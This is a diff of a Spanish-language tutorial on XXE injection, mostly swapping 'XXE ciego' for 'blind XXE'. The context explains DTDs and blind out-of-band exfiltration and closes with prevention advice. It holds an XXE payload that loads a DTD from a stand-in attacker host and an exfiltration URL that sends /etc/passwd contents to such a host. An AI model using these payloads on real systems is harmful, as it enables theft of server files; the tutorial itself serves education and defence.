@@ -11,7 +11,7 @@ date: 2021-10-10T09:19:42+01:00
 
 La inyección de entidad externa XML, también conocida en inglés como XML external entity (XXE), es una vulnerabilidad poco común en aplicaciones web que permite a un atacante interferir con el procesamiento de datos XML a través de una petición. A menudo, esto permite que un atacante lea ficheros almacenados en el servidor de aplicaciones e interactúe con cualquier sistema de back-end o externo al que la aplicación pueda acceder.
 
-Como ocurre con muchos tipos de ataques, el ataque de entidades externas se puede dividir en dos tipos: dentro y fuera de banda. Los ataques XXE en banda son más comunes y permiten que un atacante reciba una respuesta inmediata del servidor. En el caso de ataques XXE fuera de banda (también llamados XXE ciego), no hay una respuesta inmediata de la aplicación web.
+Como ocurre con muchos tipos de ataques, el ataque de entidades externas se puede dividir en dos tipos: dentro y fuera de banda. Los ataques XXE en banda son más comunes y permiten que un atacante reciba una respuesta inmediata del servidor. En el caso de ataques XXE fuera de banda (también llamados blind XXE), no hay una respuesta inmediata de la aplicación web.
 
 ![](1.png)
 
@@ -36,7 +36,7 @@ La DTD que debe utilizar el procesador XML para validar el documento XML se indi
 Una entidad consiste en un nombre y su valor (son similares a las constantes en los lenguajes de programación). Con algunas excepciones, el procesador XML sustituye las referencias a entidades por sus valores antes de procesar el documento. Una vez definida la entidad, se puede utilizar en el documento escribiendo una referencia a la entidad, que empieza con el carácter "&", sigue con el nombre de la entidad y termina con ";". (es decir, &nombreEntidad;)
 ``` 
  <!ENTITY nombre 
-   "…. declaraciones …"
+   "… declaraciones …"
    >
 ```
 Las entidades pueden ser internas o externas y tanto unas como otras pueden ser generales o paramétricas.
@@ -80,9 +80,9 @@ Y, en segundo lugar, se hace referencia a las entidades de parámetros mediante 
 
 * **Explotación de XXE para recuperar archivos,** donde se define una entidad externa que contiene el contenido de un archivo y se devuelve en la respuesta de la aplicación.
 * **Explotación de XXE para realizar ataques SSRF,** donde se define una entidad externa basada en una URL a un sistema back-end.
-* **Aprovechar el XXE ciego para recuperar datos a través de mensajes de error,** donde un atacante puede generar un mensaje de error de procesamiento que desencadene en la exfiltración de datos confidenciales.
-* **La explotación de XXE ciegos exfiltra datos fuera de banda,** donde los datos confidenciales se transmiten desde el servidor de aplicaciones a un sistema que controla el atacante. Este último ataque es en el que se hará énfasis.
-## Detección de XXE ciego 
+* **Aprovechar el blind XXE para recuperar datos a través de mensajes de error,** donde un atacante puede generar un mensaje de error de procesamiento que desencadene en la exfiltración de datos confidenciales.
+* **La explotación de blinds XXE exfiltrando datos fuera de banda,** donde los datos confidenciales se transmiten desde el servidor de aplicaciones a un sistema que controla el atacante. Este último ataque es en el que se hará énfasis.
+## Detección de blind XXE  
 Definimos una entidad externa de la siguiente manera
 ```
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://attackerserver.com/evil.dtd"> ]>
@@ -93,20 +93,25 @@ Deberíamos ver algunas interacciones DNS y/o HTTP que fueron iniciadas por la a
 
 Una vez se detecta que la entidad externa ciega es vulnerable, se procede a explotarla mediante técnicas fuera de banda.
 
-## Explotación de XXE ciego mediante técnicas fuera de banda
+## Explotación de blind XXE mediante técnicas fuera de banda
 Detectar una vulnerabilidad XXE ciega está muy bien, pero en realidad no demuestra cómo se podría explotar la vulnerabilidad. Lo que un atacante realmente quiere lograr es exfiltrar datos confidenciales. Esto se puede lograr mediante una vulnerabilidad XXE ciega, pero implica que el atacante aloje una DTD maliciosa en un sistema que controle y luego invoque la DTD externa desde la XXE en banda.
 ![](5.png)
+
 El ataque se lleva a cabo de la siguiente manera:
+
 El analizador XML primero procesa la entidad de parámetro %file, que carga el archivo /etc/passwd
 ![](6.png)
 Después, se realiza una solicitud al archivo DTD del atacante en http://attack.example.com/evil.dtd
 ![](7.png)
+
 Una vez que el analizador XML procesa el archivo DTD del atacante, la entidad de parámetro %all crea una entidad general llamada &send, que contiene la url que incluye el contenido del archivo nombrado anteriormente 
 
 (http://attacker.com/collect.php?collect=root:!:0:0::/:/usr/bin/ksh…)
 ![](8.png)
+
 Finalmente, una vez construida la URL, el analizador XML procesa la entidad &send, que realiza una solicitud al servidor del atacante.
 ![](9.png)
+
 El atacante puede registrar la solicitud en sus extremos y reconstruir el archivo a partir de la entrada del registro.
 
 ## ¿Cómo prevenimos las vulnerabilidades XXE?
@@ -114,7 +119,7 @@ Prácticamente todas las vulnerabilidades XXE surgen porque la biblioteca de an�
 
 La desactivación de DTD también hace que el analizador sea seguro contra ataques de denegación de servicios (DOS) como Billion Laughs. Si no es posible deshabilitar las DTD por completo, las entidades externas y las declaraciones de tipos de documentos externos deben deshabilitarse de la manera que sea específica para cada analizador.
 
-Podemos ver una guía detallada de prevención de XXE para varios lenguajes y analizadores XML de forma específica en el siguiente link: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+Podemos ver una guía detallada de prevención de XXE para varios lenguajes y analizadores XML de forma específica en el siguiente link: [https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
 
 
 ---
